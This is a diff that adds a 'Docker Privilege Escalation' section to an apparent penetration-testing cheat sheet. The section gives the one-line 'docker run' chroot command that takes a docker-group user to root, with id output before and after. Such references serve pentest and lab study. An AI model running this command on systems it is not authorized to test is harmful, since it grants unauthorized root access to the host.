@@ -53,6 +53,7 @@
 * [Custom Wordlists](#Custom-Wordlists)
 * [Crontab](#Crontab)
 * [LXD Privilege Escalation](#LXD-Privilege-Escalation)
+* [Docker Privilege Escalation](#Docker-Privilege-Escalation)
 * [Reverse Engineering](#Reverse-Engineering)
 
 ## Windows
@@ -922,6 +923,18 @@ lxc exec ignite /bin/sh
 
 # Enter in mounted directory
 cd /mnt/root/
+```
+
+# Docker Privilege Escalation
+
+```
+# id
+# uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# id
+# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
 ```
 
 # Reverse Engineering
